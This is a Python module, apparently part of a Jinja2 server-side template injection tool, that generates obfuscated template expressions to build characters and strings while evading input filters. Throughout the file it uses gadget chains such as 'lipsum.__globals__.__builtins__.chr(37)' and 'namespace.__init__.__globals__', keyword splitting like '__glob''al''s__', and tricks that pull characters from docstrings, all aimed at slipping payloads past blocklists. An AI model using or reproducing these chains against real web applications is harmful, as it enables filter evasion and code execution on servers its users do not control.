import re

# pylint: disable=wildcard-import,unused-wildcard-import,missing-function-docstring,unused-argument

from ..payload_gen import expression_gen
from ..rules_utils import (
    join_target,
    precedence,
    targets_from_pattern,
    literal_to_target,
)
from ..rules_types import *
from ..const import *
from ..wordlist import CHAR_PATTERNS

from ..context_vars import const_exprs, const_exprs_py3


# ---


@expression_gen
def gen_char_literal1(context, c):
    target_list = [(LITERAL, f"'{c}'" if c != "'" and c != "\\" else "'\\" + c + "'")]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_char_literal2(context, c):
    target_list = [(LITERAL, f'"{c}"' if c != '"' and c != "\\" else '"\\' + c + '"')]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_char_contextvars(context, c):
    alternatives = [
        [literal_to_target(expr)] for expr, value in const_exprs.items() if value == c
    ] + [
        [literal_to_target(expr), (REQUIRE_PYTHON3,)]
        for expr, value in const_exprs_py3.items()
        if value == c
    ]
    return [(ONEOF, alternatives)]


@expression_gen
def gen_char_selectpy3(context, c):
    matches = []
    for pattern, d in CHAR_PATTERNS.items():
        for index_str, value in d.items():
            if value == c:
                matches.append(
                    targets_from_pattern(pattern, {"INDEX": (INTEGER, int(index_str))})
                )
    if not matches:
        return [(UNSATISFIED,)]
    target_list = [(ONEOF, matches)]
    return [(REQUIRE_PYTHON3,), (EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_char_selectpy2(context, c):
    matches = []
    # in python2, reversed might not be an iterator
    for pattern, d in CHAR_PATTERNS.items():
        if "dict" in pattern or "reverse" in pattern:
            continue
        for index_str, value in d.items():
            if value == c:
                matches.append(
                    targets_from_pattern(pattern, {"INDEX": (INTEGER, int(index_str))})
                )
    if not matches:
        return [(UNSATISFIED,)]
    target_list = [(ONEOF, matches)]
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_char_select(context, c):
    d = {
        2: "l",
        3: "t",
        4: ";",
        5: "g",
        6: "e",
        7: "n",
        8: "e",
        9: "r",
        10: "a",
        11: "t",
        12: "o",
        13: "r",
        14: " ",
        15: "o",
        16: "b",
        17: "j",
        18: "e",
        19: "c",
        20: "t",
        21: " ",
        22: "s",
        23: "y",
        24: "n",
        25: "c",
        26: "_",
        27: "d",
        28: "o",
        29: "_",
        30: "s",
        31: "l",
        32: "i",
        33: "c",
        34: "e",
        35: " ",
        36: "a",
        37: "t",
        38: " ",
        39: "0",
        40: "x",
    }

    if c not in d.values():
        return [(UNSATISFIED,)]
    matches = []
    for index, value in d.items():
        if value == c:
            matches.append(
                targets_from_pattern(
                    "x|slice(0)|e|list|batch(INDEX)|first|last",
                    {"0": (INTEGER, 0), "INDEX": (INTEGER, index)},
                )
            )
    target_list = [(ONEOF, matches)]
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_char_flaskg(context, c):
    d = {
        1: "&",
        2: "l",
        3: "t",
        4: ";",
        5: "f",
        6: "l",
        7: "a",
        8: "s",
        9: "k",
        10: ".",
        11: "g",
        12: " ",
        13: "o",
        14: "f",
    }
    if c not in d.values():
        return [(UNSATISFIED,)]
    matches = []
    for index, value in d.items():
        if value == c:
            matches.append(
                targets_from_pattern(
                    "{G}|e|batch({INDEX})|first|last",
                    {"{G}": (FLASK_CONTEXT_VAR, "g"), "{INDEX}": (INTEGER, index)},
                )
            )
    target_list = [(ONEOF, matches)]
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_char_dict(context, c):
    if not re.match("[A-Za-z]", c):
        return [(UNSATISFIED,)]
    target_list = [(LITERAL, f"dict({c}=x)|join")]
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_char_namespacedict(context, c):
    if not re.match("[A-Za-z]", c):
        return [(UNSATISFIED,)]
    target_list = [(LITERAL, f"namespace({c}=x)._Namespace__attrs|join")]
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_char_num(context, c):
    if not re.match("[0-9]", c):
        return [(UNSATISFIED,)]
    target_list = targets_from_pattern(
        "INT.__str__( )",
        {
            "INT": (ENCLOSE_UNDER, precedence["attribute"], (INTEGER, int(c))),
            " ": (WHITESPACE,),
        },
    )
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_char_num2(context, c):
    if not re.match("[0-9]", c):
        return [(UNSATISFIED,)]
    target_list = [
        (
            LITERAL,
            "(",
        ),
        (INTEGER, int(c)),
        (LITERAL, ")|string"),
    ]
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_char_lipsumdoc(context, c):
    lipsum_doc = """Generate some lorem ipsum for the template."""
    if c not in lipsum_doc:
        return [(UNSATISFIED,)]
    return [
        (
            EXPRESSION,
            precedence["item"],
            [
                (JINJA_CONTEXT_VAR, "lipsum"),
                (LITERAL, "["),
                (VARIABLE_OF, "__doc__"),
                (LITERAL, "]["),
                (INTEGER, lipsum_doc.index(c)),
                (LITERAL, "]"),
            ],
        )
    ]


@expression_gen
def gen_char_cyclerdoc(cotext, c):
    doc = """Cycle through values by yield them one at a time, then restarting
    once the end is reached. Available as ``cycler`` in templates.

    Similar to ``loop.cycle``, but can be used outside loops or across
    multiple loops. For example, render a list of folders and files in a
    list, alternating giving them "odd" and "even" classes.

    .. code-block:: html+jinja

        {% set row_class = cycler("odd", "even") %}
        <ul class="browser">
        {% for folder in folders %}
          <li class="folder {{ row_class.next() }}">{{ folder }}
        {% endfor %}
        {% for file in files %}
          <li class="file {{ row_class.next() }}">{{ file }}
        {% endfor %}
        </ul>

    :param items: Each positional argument will be yielded in the order
        given for each cycle.

    .. versionadded:: 2.1
    """
    alternatives = []
    for i, ch in enumerate(doc):
        if ch == c:
            alternatives += [
                [(LITERAL, f"cycler.__doc__[{i}]")],
                [(LITERAL, f"cycler.__doc__|batch({i+1})|first|last")],
            ]
        if len(alternatives) > 100:  # for perfomance
            break
    target_list = [(ONEOF, alternatives)]
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_char_cycledoc2(context, c):
    doc = """Cycle through values by yield them one at a time, then restarting
    once the end is reached. Available as ``cycler`` in templates.

    Similar to ``loop.cycle``, but can be used outside loops or across
    multiple loops. For example, render a list of folders and files in a
    list, alternating giving them "odd" and "even" classes.

    .. code-block:: html+jinja

        {% set row_class = cycler("odd", "even") %}
        <ul class="browser">
        {% for folder in folders %}
          <li class="folder {{ row_class.next() }}">{{ folder }}
        {% endfor %}
        {% for file in files %}
          <li class="file {{ row_class.next() }}">{{ file }}
        {% endfor %}
        </ul>

    :param items: Each positional argument will be yielded in the order
        given for each cycle.

    .. versionadded:: 2.1
    """
    if c not in doc:
        return [(UNSATISFIED,)]
    return [
        (
            EXPRESSION,
            precedence["item"],
            [
                (JINJA_CONTEXT_VAR, "cycler"),
                (LITERAL, "["),
                (VARIABLE_OF, "__doc__"),
                (LITERAL, "]["),
                (INTEGER, doc.index(c)),
                (LITERAL, "]"),
            ],
        )
    ]


# ---


@expression_gen
def gen_string_lower_c_literal1(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, "'c'")])]


@expression_gen
def gen_string_lower_c_literal2(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, '"c"')])]


@expression_gen
def gen_string_lower_c_joindict(context):
    return [(EXPRESSION, precedence["plain_filter"], [(LITERAL, "dict(c=i)|join")])]


@expression_gen
def gen_string_lower_c_joinnamespacedict(context):
    return [
        (
            EXPRESSION,
            precedence["plain_filter"],
            [(LITERAL, "namespace(c=x)._Namespace__attrs|join")],
        )
    ]


@expression_gen
def gen_string_lower_c_lipsumurlencode(context):
    return [
        (
            EXPRESSION,
            precedence["plain_filter"],
            [(LITERAL, "lipsum|pprint|first|urlencode|last|lower")],
        )
    ]


@expression_gen
def gen_string_lower_c_lipsumbatch(context):
    return [
        (
            EXPRESSION,
            precedence["plain_filter"],
            [
                (LITERAL, "lipsum|escape|batch("),
                (INTEGER, 8),
                (LITERAL, ")|first|last"),
            ],
        )
    ]


@expression_gen
def gen_string_lower_c_joinerbatch(context):
    return [
        (
            EXPRESSION,
            precedence["plain_filter"],
            [
                (LITERAL, "joiner|string|batch("),
                (INTEGER, 2),
                (LITERAL, ")|first|last"),
            ],
        )
    ]


@expression_gen
def gen_string_lower_c_namespacebatch(context):
    return [
        (
            EXPRESSION,
            precedence["plain_filter"],
            [
                (LITERAL, "namespace|escape|batch("),
                (INTEGER, 36),
                (LITERAL, ")|first|last"),
            ],
        )
    ]


# range|trim|batch(2)|first|last


@expression_gen
def gen_string_lower_c_classbatch(context):
    class_alternatives: List[List[Target]] = [
        [(LITERAL, s)]
        for s in [
            "range",
            "cycler",
            "joiner",
            "namespace",
        ]
    ]
    tostring_alternatives: List[List[Target]] = [
        [(LITERAL, s)]
        for s in [
            "trim",
            "string",
        ]
    ]
    targets = targets_from_pattern(
        "{CLASS}|{TOSTRING}|batch({2})|first|last",
        {
            "{CLASS}": (ONEOF, class_alternatives),
            "{TOSTRING}": (ONEOF, tostring_alternatives),
            "{2}": (INTEGER, 2),
        },
    )
    return [(EXPRESSION, precedence["plain_filter"], targets)]


@expression_gen
def gen_string_lower_c_classbatch2(context):
    class_alternatives: List[List[Target]] = [
        [(LITERAL, s)]
        for s in [
            "range",
            "cycler",
            "joiner",
            "namespace",
        ]
    ]
    targets = targets_from_pattern(
        "{CLASS}|e|batch({5})|first|last",
        {"{CLASS}": (ONEOF, class_alternatives), "{5}": (INTEGER, 5)},
    )
    return [(EXPRESSION, precedence["plain_filter"], targets)]


@expression_gen
def gen_string_lower_c_char(context):
    return [(CHAR, "c")]


# ---


@expression_gen
def gen_string_percent_literal1(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, "'%'")])]


@expression_gen
def gen_string_percent_literal2(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, '"%"')])]


@expression_gen
def gen_string_percent_context(context):
    if "%" not in context.values():
        return [(UNSATISFIED,)]
    v = [k for k, v in context.items() if v == "%"][0]
    return [(EXPRESSION, precedence["literal"], [(LITERAL, v), (WITH_CONTEXT_VAR, v)])]


@expression_gen
def gen_string_percent_urlencode1(context):
    return [(EXPRESSION, precedence["plain_filter"], [(LITERAL, "lipsum()|urlencode|first")])]


@expression_gen
def gen_string_percent_urlencode2(context):
    return [
        (EXPRESSION, precedence["plain_filter"], [(LITERAL, "{}|escape|urlencode|first")])
    ]


@expression_gen
def gen_string_percent_lipsum1(context):
    target_list = targets_from_pattern(
        "lipsum[GLOBALS][BUILTINS][CHR](37)",
        {
            "GLOBALS": (
                ONEOF,
                [
                    [(LITERAL, "'__glob''al''s__'")],
                    [(VARIABLE_OF, "__globals__")],
                ],
            ),
            "BUILTINS": (
                ONEOF,
                [
                    [(LITERAL, "'__builti''ns__'")],
                    [(VARIABLE_OF, "__builtins__")],
                ],
            ),
            "CHR": (
                ONEOF,
                [
                    [(LITERAL, "'ch''r'")],
                    [(VARIABLE_OF, "chr")],
                ],
            ),
            "37": (INTEGER, 37),
        },
    )
    return [
        (
            EXPRESSION,
            precedence["function_call"],
            target_list,
        )
    ]


@expression_gen
def gen_string_percent_lipsum2(context):
    return [
        (
            EXPRESSION,
            precedence["function_call"],
            [(LITERAL, "lipsum.__globals__.__builtins__.chr(37)")],
        )
    ]


@expression_gen
def gen_string_percent_lipsum3(context):
    return [
        (
            EXPRESSION,
            precedence["function_call"],
            [
                (LITERAL, "lipsum["),
                (VARIABLE_OF, "__globals__"),
                (LITERAL, "]["),
                (VARIABLE_OF, "__builtins__"),
                (LITERAL, "]["),
                (VARIABLE_OF, "chr"),
                (LITERAL, "]("),
                (WHITESPACE,),
                (INTEGER, 37),
                (WHITESPACE,),
                (LITERAL, ")"),
            ],
        )
    ]


@expression_gen
def gen_string_percent_lipsum4(context):
    # lipsum|attr("__getitem__")("__builtins__")|attr("__getitem__")("chr")(37)
    return [
        (
            EXPRESSION,
            precedence["function_call"],
            [
                (LITERAL, "lipsum|attr("),
                (WHITESPACE,),
                (VARIABLE_OF, "__globals__"),
                (WHITESPACE,),
                (LITERAL, ")|attr("),
                (WHITESPACE,),
                (VARIABLE_OF, "__getitem__"),
                (WHITESPACE,),
                (LITERAL, ")("),
                (WHITESPACE,),
                (VARIABLE_OF, "__builtins__"),
                (WHITESPACE,),
                (LITERAL, ")|attr("),
                (WHITESPACE,),
                (VARIABLE_OF, "__getitem__"),
                (WHITESPACE,),
                (LITERAL, ")("),
                (WHITESPACE,),
                (VARIABLE_OF, "chr"),
                (WHITESPACE,),
                (LITERAL, ")("),
                (WHITESPACE,),
                (INTEGER, 37),
                (WHITESPACE,),
                (LITERAL, ")"),
            ],
        )
    ]


# ((12).__mod__.__doc__|batch(12)|first|last)


@expression_gen
def gen_string_percent_moddoc(context):
    target_list = [
        (
            ONEOF,
            [
                [(LITERAL, "(1).__mod__.__doc__")],
                [(LITERAL, "(( ).__len__( )).__mod__.__doc__")],
                [(LITERAL, "((\t).__len__(\t)).__mod__.__doc__")],
                [(LITERAL, "((\n).__len__(\n)).__mod__.__doc__")],
                [(LITERAL, "([ ].__len__( )).__mod__.__doc__")],
                [
                    (
                        LITERAL,
                        "((1)|attr(dict(__mod__=1)|first)|attr(dict(__doc__=1)|first))",
                    )
                ],
                [
                    (
                        LITERAL,
                        "((1)|attr(dict(__m=1,od__=1)|join)|attr(dict(__d=1,oc__=1)|join))",
                    )
                ],
            ],
        ),
        (
            ONEOF,
            [
                [(LITERAL, "["), (INTEGER, 11), (LITERAL, "]")],
                [
                    (LITERAL, ".__getitem__("),
                    (WHITESPACE,),
                    (INTEGER, 11),
                    (WHITESPACE,),
                    (LITERAL, ")"),
                ],
                [(LITERAL, "|batch(12)|first|last")],
            ],
        ),
    ]
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_string_percent_namespace(context):
    target_list = targets_from_pattern(
        "namespace[INIT][GLOBALS][BUILTINS]['chr'](37)",
        {
            "INIT": (
                ONEOF,
                [
                    [(LITERAL, "'__ini''t__'")],
                    [(VARIABLE_OF, "__init__")],
                ],
            ),
            "GLOBALS": (
                ONEOF,
                [
                    [(LITERAL, "'__glob''al''s__'")],
                    [(VARIABLE_OF, "__globals__")],
                ],
            ),
            "BUILTINS": (
                ONEOF,
                [
                    [(LITERAL, "'__builti''ns__'")],
                    [(VARIABLE_OF, "__builtins__")],
                ],
            ),
            "CHR": (
                ONEOF,
                [
                    [(LITERAL, "'ch''r'")],
                    [(VARIABLE_OF, "chr")],
                ],
            ),
            "37": (INTEGER, 37),
        },
    )
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_percent_dictbatch(context):
    whatever_onedigit_number = (ONEOF, [[(INTEGER, i)] for i in range(1, 10)])
    target_list = [
        (
            LITERAL,
            "((dict(dict(dict(a=",
        ),
        whatever_onedigit_number,
        (LITERAL, ")|tojson|batch("),
        (INTEGER, 2),
        (LITERAL, "))|batch("),
        (INTEGER, 2),
        (LITERAL, "))|join,"),
        (STRING_LOWERC,),
        (LITERAL, ",dict()|trim|last)|join).format("),
        (INTEGER, 37),
        (LITERAL, ")"),
    ]
    return [
        (EXPRESSION, precedence["function_call"], target_list),
        (REQUIRE_PYTHON3,),
    ]


@expression_gen
def gen_string_percent_lipsum(context):
    target_list = [
        (
            LITERAL,
            "lipsum[(lipsum|escape|batch(22)|list|first|last)*2"
            + "+dict(globals=i)|join+(lipsum|escape|batch(22)|list|first|last)*2]"
            + "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=i)"
            + "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=i)|join](37)",
        )
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_percent_lipsumcomplex(context):
    target_list = [
        (LITERAL, "lipsum[(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "+dict(gl=x,obals=x)|join+(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "][(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "+dict(bui=x,ltins=x)|join+(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "][dict(c=x,hr=x)|join]("),
        (INTEGER, 37),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_percent_urlencodelong(context):
    target_list = [
        (
            ONEOF,
            [
                [(LITERAL, "(lipsum,)|map(")],
                [(LITERAL, "(cycler,)|map(")],
                [(LITERAL, "(joiner,)|map(")],
                [(LITERAL, "(namespace,)|map(")],
            ],
        ),
        (
            ONEOF,
            [
                [(LITERAL, "'ur''lencode'")],
                [(LITERAL, '"ur""lencode"')],
                [(LITERAL, "dict(urlencode=i)|first")],
                [(LITERAL, "dict(ur=x,lenc=x,ode=x)|join"), (REQUIRE_PYTHON3,)],
                [(LITERAL, "dict(ur=x,le=x,nco=x,de=x)|join"), (REQUIRE_PYTHON3,)],
                [(VARIABLE_OF, "urlencode")],
            ],
        ),
        (LITERAL, ")|first|first"),
    ]
    return [(EXPRESSION, precedence["enclose"], target_list)]


# (dict(((0,1),(0,1)))|replace(1|center|first,x)|replace(1,'c')).format(37)
@expression_gen
def gen_string_percent_replaceformat(context):
    target_list = [
        (
            LITERAL,
            "(dict(((0,1),(0,1)))|replace(1|center|first,x)|replace(1,",
        ),
        (STRING_LOWERC,),
        (LITERAL, ")).format("),
        (INTEGER, 37),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


# (dict(((2,3),(2,3)))|replace(1|center|first,x)|replace(3,'c')).format(2,2,37)
@expression_gen
def gen_string_percent_replaceformat2(context):
    target_list = [
        (
            LITERAL,
            "(dict(((2,3),(2,3)))|replace(1|center|first,x)|replace(3,",
        ),
        (STRING_LOWERC,),
        (LITERAL, ")).format(2,2,"),
        (INTEGER, 37),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


# ({1:1}|trim|replace(1,x|trim)|replace(x|center|first,"c")).format(37)


@expression_gen
def gen_string_percent_replaceformat3(context):
    target_list = [
        (
            ONEOF,
            [
                [
                    (
                        LITERAL,
                        "({NUM:NUM}|trim|replace(NUM,x|trim)|replace(x|center|first,".replace(
                            "NUM", str(i)
                        ),
                    )
                ]
                for i in range(0, 10)
            ],
        ),
        (STRING_LOWERC,),
        (LITERAL, ")).format("),
        (INTEGER, 37),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list), (REQUIRE_PYTHON3,)]


@expression_gen
def gen_string_percent_char(context):
    return [(CHAR, "%")]


# ---


@expression_gen
def gen_string_percent_lower_c_literal1(context):
    target_list = [(LITERAL, "'%c'")]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_percent_lower_c_literal2(context):
    target_list = [(LITERAL, '"%c"')]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_percent_lower_c_literal3(context):
    target_list = [(LITERAL, '"%""c"')]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_percent_lower_c_literal5(context):
    target_list = [
        (
            ONEOF,
            [
                [(LITERAL, "'%'")],
                [(LITERAL, '"%"')],
            ],
        ),
        (
            ONEOF,
            [
                [(LITERAL, " ")],
                [(LITERAL, "\t")],
                [(LITERAL, "\n")],
                [(LITERAL, "\r")],
            ],
        ),
        (
            ONEOF,
            [
                [(LITERAL, "'c'")],
                [(LITERAL, '"c"')],
            ],
        ),
    ]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_percent_lower_c_context(context):
    if "%c" not in context.values():
        return [(UNSATISFIED,)]
    vs = [k for k, v in context.items() if v == "%c"]
    alternatives = [[(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)] for v in vs]
    return [(EXPRESSION, precedence["literal"], [(ONEOF, alternatives)])]


@expression_gen
def gen_string_percent_lower_c_concat(context):
    return [(STRING_CONCAT, (STRING_PERCENT,), (STRING_LOWERC,))]


@expression_gen
def gen_string_percent_lower_c_dictjoin(context):
    # "(dict([('%',x),('c',x)])|join)"
    pattern = "dict([(PERCENT,x),(LOWERC,x)])|join"
    targets = targets_from_pattern(
        pattern, {"PERCENT": (STRING_PERCENT,), "LOWERC": (STRING_LOWERC,)}
    )
    return [(EXPRESSION, precedence["plain_filter"], targets), (REQUIRE_PYTHON3,)]


@expression_gen
def gen_string_percent_lower_c_listjoin(context):
    # "(['%','c']|join)"
    pattern = "[PERCENT,LOWERC]|join"
    targets = targets_from_pattern(
        pattern, {"PERCENT": (STRING_PERCENT,), "LOWERC": (STRING_LOWERC,)}
    )
    return [(EXPRESSION, precedence["plain_filter"], targets)]


@expression_gen
def gen_string_percent_lower_c_tuplejoin(context):
    # "(('%','c')|join)"
    pattern = "(PERCENT,LOWERC)|join"
    targets = targets_from_pattern(
        pattern, {"PERCENT": (STRING_PERCENT,), "LOWERC": (STRING_LOWERC,)}
    )
    return [(EXPRESSION, precedence["plain_filter"], targets)]


@expression_gen
def gen_string_percent_lower_c_replaceconcat(context):
    # ('c'|replace(x|trim,'%',1))
    pattern = "LOWERC|replace(x|trim,PERCENT,ONE)"
    targets = targets_from_pattern(
        pattern,
        {"LOWERC": (STRING_LOWERC,), "PERCENT": (STRING_PERCENT,), "ONE": (INTEGER, 1)},
    )
    return [(EXPRESSION, precedence["called_filter"], targets)]


@expression_gen
def gen_string_percent_lower_c_cycler(context):
    pattern = (
        "cycler|pprint|list|pprint|urlencode|batch(TEN)"
        + "|first|join|batch(EIGHT)|list|last|reverse|join|lower"
    )
    targets = targets_from_pattern(
        pattern, {"TEN": (INTEGER, 10), "EIGHT": (INTEGER, 8)}
    )
    return [(EXPRESSION, precedence["plain_filter"], targets)]


# ---


@expression_gen
def gen_string_many_percent_lower_c_asis(context, count: int):
    if count != 1:
        return [(UNSATISFIED,)]
    return [(STRING_PERCENT_LOWER_C,)]


@expression_gen
def gen_string_many_percent_lower_c_multiply(context, count: int):
    return [(MULTIPLY, (STRING_PERCENT_LOWER_C,), (INTEGER, count))]


@expression_gen
def gen_string_many_percent_lower_c_literal1(context, count: int):
    return [
        (
            EXPRESSION,
            precedence["literal"],
            [(LITERAL, "'"), (LITERAL, "%c" * count), (LITERAL, "'")],
        )
    ]


@expression_gen
def gen_string_many_percent_lower_c_literal2(context, count: int):
    return [
        (
            EXPRESSION,
            precedence["literal"],
            [(LITERAL, '"'), (LITERAL, "%c" * count), (LITERAL, '"')],
        )
    ]


@expression_gen
def gen_string_many_percent_lower_c_replacespace(context, count: int):
    # (x|center(2)|replace(x|center|first,'%c'))
    target_list = targets_from_pattern(
        "x|center( COUNT )|replace(x|center|first,'%c' )",
        {
            "COUNT": (INTEGER, count),
            "'%c'": (STRING_PERCENT_LOWER_C,),
            " ": (WHITESPACE,),
        },
    )

    return [(EXPRESSION, precedence["called_filter"], target_list)]


@expression_gen
def gen_string_many_percent_lower_c_nulljoin(context, count: int):
    # ((x,x,x)|join('%c'))
    if count == 1:
        return [(STRING_PERCENT_LOWER_C,)]
    target_list = targets_from_pattern(
        "( ( {TUPLE}{,} )|join( {PERCENT_LOWER_C} ) )",
        {
            "{TUPLE}": join_target(
                (LITERAL, ","), [(LITERAL, "x") for _ in range(count + 1)]
            ),
            "{PERCENT_LOWER_C}": (STRING_PERCENT_LOWER_C,),
            "{,}": (ONEOF, [[(LITERAL, "")], [(LITERAL, "")]]),
            " ": (WHITESPACE,),
        },
    )
    return [(EXPRESSION, precedence["called_filter"], target_list)]


@expression_gen
def gen_string_many_percent_lower_c_concat(context, count: int):
    return [(STRING_CONCATMANY, [(STRING_PERCENT_LOWER_C,) for _ in range(count)])]


@expression_gen
def gen_string_many_percent_lower_c_join(context, count: int):
    if count == 1:
        return [(STRING_PERCENT_LOWER_C,)]
    target_list = targets_from_pattern(
        "( PARTS )|join",
        {
            "PARTS": join_target(
                (LITERAL, ","),
                targets=[(STRING_PERCENT_LOWER_C,) for _ in range(count)],
            ),
            " ": (WHITESPACE,),
        },
    )
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


# ---


@expression_gen
def gen_string_underline_literal1(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, "'_'")])]


@expression_gen
def gen_string_underline_literal2(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, '"_"')])]


@expression_gen
def gen_string_underline_context(context: dict):
    return [(EXPRESSION, precedence["literal"], [(VARIABLE_OF, "_")])]


@expression_gen
def gen_string_underline_format(context):
    targets = [
        (
            ONEOF,
            [
                [(LITERAL, '"%c"%')],
                [(LITERAL, '"%""c"%')],
                [(LITERAL, "'%c'%")],
                [(LITERAL, "'%''c'%")],
            ],
        ),
        (ENCLOSE_UNDER, precedence["mod"], (INTEGER, ord("_"))),
    ]
    return [(EXPRESSION, precedence["mod"], targets)]


@expression_gen
def gen_string_underline_lipsum(context):
    target_list = targets_from_pattern(
        "lipsum|escape|batch(22)|list|first|last", {"22": (INTEGER, 22)}
    )
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_string_underline_tupleselect(context):
    target_list = targets_from_pattern(
        "()|select|string|batch(25)|first|last", {"25": (INTEGER, 25)}
    )
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_string_underline_gget(context):
    target_list = targets_from_pattern(
        "{G}|attr({GET})|e|batch({18})|first|last",
        {
            "{G}": (FLASK_CONTEXT_VAR, "g"),
            "{GET}": (VARIABLE_OF, "get"),
            "{18}": (INTEGER, 18),
        },
    )
    return [(EXPRESSION, precedence["plain_filter"], target_list)]


@expression_gen
def gen_string_underline_char(context):
    return [(CHAR, "_")]


# ---


@expression_gen
def gen_string_twounderline_variable(context):
    return [(VARIABLE_OF, "__")]


@expression_gen
def gen_string_twounderline_concat(context):
    return [(STRING_CONCAT, (STRING_UNDERLINE,), (STRING_UNDERLINE,))]


@expression_gen
def gen_string_twounderline_multiply(context):
    return [(MULTIPLY, (STRING_UNDERLINE,), (INTEGER, 2))]


@expression_gen
def gen_string_twounderline_format(context):
    targets = [
        (ENCLOSE_UNDER, precedence["mod"], (STRING, "%s%%s")),
        (LITERAL, "%"),
        (ENCLOSE_UNDER, precedence["mod"], (STRING_UNDERLINE,)),
        (LITERAL, "%"),
        (ENCLOSE_UNDER, precedence["mod"], (STRING_UNDERLINE,)),
    ]
    return [(EXPRESSION, precedence["mod"], targets)]


@expression_gen
def gen_string_twounderline_formatfilter(context):
    targets = [
        (ENCLOSE_UNDER, precedence["plain_filter"], (STRING, "%s%%s")),
        (LITERAL, "|format("),
        (WHITESPACE,),
        (STRING_UNDERLINE,),
        (WHITESPACE,),
        (LITERAL, ")"),
        (LITERAL, "|format("),
        (WHITESPACE,),
        (STRING_UNDERLINE,),
        (WHITESPACE,),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["called_filter"], targets)]


# ---


@expression_gen
def gen_string_many_format_c_simple(context, num):
    return [
        (
            MULTIPLY,
            (
                EXPRESSION,
                precedence["literal"],
                [(ONEOF, [[(LITERAL, "'{:c}'")], [(LITERAL, '"{:c}"')]])],
            ),
            (INTEGER, num),
        )
    ]


@expression_gen
def gen_string_many_format_c_complex(context, num):
    fomat_c_target_list = [
        (
            LITERAL,
            (
                "{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)"
                + "|replace(1|string,{}|join)|replace(2|string,"
            ),
        ),
        (STRING_LOWERC,),
        (WHITESPACE,),
        (LITERAL, ")"),
    ]
    return [
        (
            MULTIPLY,
            (EXPRESSION, precedence["called_filter"], fomat_c_target_list),
            (INTEGER, num),
        )
    ]
